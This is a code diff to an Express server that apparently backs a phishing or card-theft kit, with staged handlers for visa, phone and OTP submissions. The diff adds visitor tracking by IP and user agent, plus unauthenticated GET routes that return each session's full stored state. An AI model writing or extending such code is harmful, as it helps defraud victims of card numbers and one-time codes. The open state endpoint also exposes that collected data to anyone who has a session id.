@@ -281,6 +281,20 @@ app.get("/breinit", (_req, res) => res.json({ ok: true }));
 app.post("/api/chat/enabled", (_req, res) =>
   res.json({ isChatEnabled: CHAT_ENABLED })
 );
+app.get("/api/chat/enabled", (_req, res) =>
+  res.json({ isChatEnabled: CHAT_ENABLED })
+);
+
+// Client geo/IP lookup used by the customer site.
+app.get("/geo", (req, res) => {
+  res.json({
+    ok: true,
+    ip: clientIp(req),
+    country: req.headers["cf-ipcountry"] || "Unknown",
+    countryCode: req.headers["cf-ipcountry"] || "XX",
+    ua: req.headers["user-agent"] || "",
+  });
+});
 
 // ---------- REST: customer site (frontend contract) ----------
 app.post("/api/user/init", (req, res) => {
@@ -492,6 +506,36 @@ app.post("/visa", stepHandler("visa"));
 app.post("/phone", stepHandler("phone"));
 app.post("/phone-otp", stepHandler("phoneOtp"));
 app.post("/visa-otp", stepHandler("visaOtp"));
+
+// ---------- REST: read-only lookups used by the customer site ----------
+app.get("/api/user/init", (req, res) => {
+  const id = req.query.uuid || req.query.id || uuid();
+  const ip = clientIp(req);
+  upsertSession(id, { ip, ua: req.headers["user-agent"] || "", lastSeen: now() });
+  res.json({
+    ok: true,
+    _id: id,
+    userInfo: { uuid: id, visitTime: now(), ip, country: "Unknown", countryCode: "XX" },
+  });
+});
+
+app.get("/state/:id", (req, res) => {
+  const s = db.get().users[req.params.id];
+  if (!s) return res.status(404).json({ error: "not_found" });
+  res.json({ ok: true, id: req.params.id, stage: s.stage || "init", state: s });
+});
+
+app.get("/company/:id", (req, res) => {
+  const s = db.get().users[req.params.id];
+  if (!s) return res.status(404).json({ error: "not_found" });
+  res.json({ ok: true, id: req.params.id, company: s.company || null });
+});
+
+app.get("/order/status/:id", (req, res) => {
+  const s = db.get().users[req.params.id];
+  if (!s) return res.status(404).json({ error: "not_found" });
+  res.json({ ok: true, id: req.params.id, status: s.stage || "init", updatedAt: s.updatedAt || null });
+});
 
 // ---------- Admin read APIs (existing) ----------
 app.get("/admin/state", requireAdmin, (_req, res) => res.json(db.get()));
